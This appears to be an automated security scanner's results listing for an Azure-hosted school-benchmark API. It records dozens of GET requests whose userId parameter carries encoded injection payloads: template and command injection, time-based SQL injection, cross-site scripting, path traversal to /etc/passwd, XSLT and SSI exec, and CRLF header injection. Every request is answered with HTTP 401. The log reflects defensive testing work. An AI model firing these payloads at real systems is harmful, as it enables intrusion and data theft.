* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527%2528&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%252F%252F1498374535918995670.owasp.org&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%252F&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%252Fetc%252Fpasswd&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%252Fuser-data&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%252FWEB-INF%252Fweb.xml&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253B&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253C%2521--&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253C&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253Cxsl%253Avalue-of+select%253D%2522document%2528%2527http%253A%252F%252Fs198d01-ebis-benchmark-fa.azurewebsites.net%253A22%2527%2529%2522%252F%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253Cxsl%253Avalue-of+select%253D%2522php%253Afunction%2528%2527exec%2527%252C%2527erroneous_command+2%253E%2526amp%253B1%2527%2529%2522%252F%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%253Cxsl%253Avariable+name%253D%2522rtobject%2522+select%253D%2522runtime%253AgetRuntime%2528%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522process%2522+select%253D%2522runtime%253Aexec%2528%2524rtobject%252C%2527erroneous_command%2527%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522waiting%2522+select%253D%2522process%253AwaitFor%2528%2524process%2529%2522%252F%253E%250A%253Cxsl%253Avalue-of+select%253D%2522%2524process%2522%252F%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%255Cuser-data&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%255CWEB-INF%255Cweb.xml&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%255D%255D%253E&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=%257Bsystem%2528%2522sleep+15%2522%2529%257D&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=0W45pz4p&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=1498374535918995670.owasp.org&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=5%253BURL%253D%2527https%253A%252F%252F1498374535918995670.owasp.org%2527&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=any%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=any%253F%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=c%253A%252F&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=c%253A%252FWindows%252Fsystem.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=c%253A%255C&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=c%253A%255CWindows%255Csystem.ini&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=cat+%252Fetc%252Fpasswd&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=DRbNpMkstawlPwOoDgVSAsCgAPfjtGVOJykTjJncdKcNAJhPDJKLjBpWWTUMmkZTdwwjrdwnTFTjJuJsXoCuuKvquajnRwrdtEXKWAHaRGCMHSekpvxXThYDZAnFsZXeXaHvqWtplQeFthqCDLdsDETmDAMrhOhgKMVOrWiaFsDYWbIVFKBmLpdBejjEduIYjiIghHpKHjSnOYpaPwbhYssFbSplgejTIojHVwrjAEoXRGsuKkflgNfYhcZuBctiyEjOJMDeFDZydKscJDDbGOACcKWhwAwCcoOapWlNSuHPQgbPhOGUtwxkJOPnuXYGOvcAxeZOXZyljrGUELmJaqbWCwXnCCQIPHPikvftMnRnJaUXgBewlEPVhOxsyeSYiDboyLUwBIhSqxfMotSRqYrSRkwPOcNeZMjiuDvjMOVSZTcMQIHKIpgcApcaxkEeYBvfRRMTRWhJVjmkXDFbNejPnAOJpJXuHSxtBrqCSuWYToQSXEwoQYbVAjPpJpknbFQFpoAwMJJOJvbslAgBymHvMUtMQYXMJZUOFmUXkvntfdhFoyKjwnXCCUAcjsqDRXJEBiVYJLxpvmvWqctmmFSIMZfFCPaGmHgAdPTxlWZRwGavJkcsBjErlbANKtysBpShdYobaCojpHXkWhbieofOpgnFZHjGxCWdLXCqnYMExQUqxVQkxqOxfGyFplECRXefeXFPLApMKtWxmjLVpXYoYUYPTmybQcMESCYxrYeTLnanBPRffqqmxAyExKInxQpYVmPYXelrrfbTcyUdHHXuMdlAiMGpDsytAiLyaCTaXuiOVFxoOaGWNwFgkMQoQhXvdankBfkTJYBtXRAKZTXEVsjMAxeUefODHepEjbqsNmdMpWepkIxjPvrYmQeBqPmCWEHOrnKqGLbWbkEIIeYWULhgqeUvghsvrbFSjYyAbhprJByZFrsIiYFqNCtpBVIIvBwonPnxhfpmFUxojWtItANQjUmCFQlLVsDjqfEBPcqJVDWcEyZPuJQojJskFjlEKptjApqlxAdquTyPShmpDbhagKnUKlPrOiRavMeuupWgPnMlpjrHfQADZEZYwMrmQJdeSnoTUenyjbAZsenNIXafAfqdhelIoBMxQEZlKWXLlbigahYxybxePcILpRnoHGZPmLOfhplmhWrVlpmIWRYPRRIGSwwekxeBdDfGRBnxiUCssqLwGrpgFoWyDngrQbVNdvFeeiussXoUesDPfnPtjWJvfMYiMtMiFlPpZsNWcGPpkfhFrnvnHhTjkRsnRRDylLSLDTARABgKYyhkfMXEajaobhKDZUTRngUrJeiIItFqbhsWivmSljExvaHCHlsykfNbBhjVhSRAKUXrAixOFbEXxalQqiZnToywbAAsplQvYyOjmSDNTTMjuJpCksGKfDuGXPAiNTMKSWfIruUNjysNwVmXMWIFvvTPFlUnWmSNUilfjJyLwNVoDfLvoHhLdcFpDudoGFeymnrewNcShsqyOuDcaeRyMPRDWZxshVOwkQbJldmWevRBPoFkFmtkUAEulsHGOtFjKxgDcHTxgCONiHVaXsspXYkKhCLSHYrknscExFrNiuwpPwyfsfcCAbIqZRuFYsySGGbZScHKnvokHmHrhJTRRKPPNRQlORrqbMLkghwcsYrqPxIRLZXJbM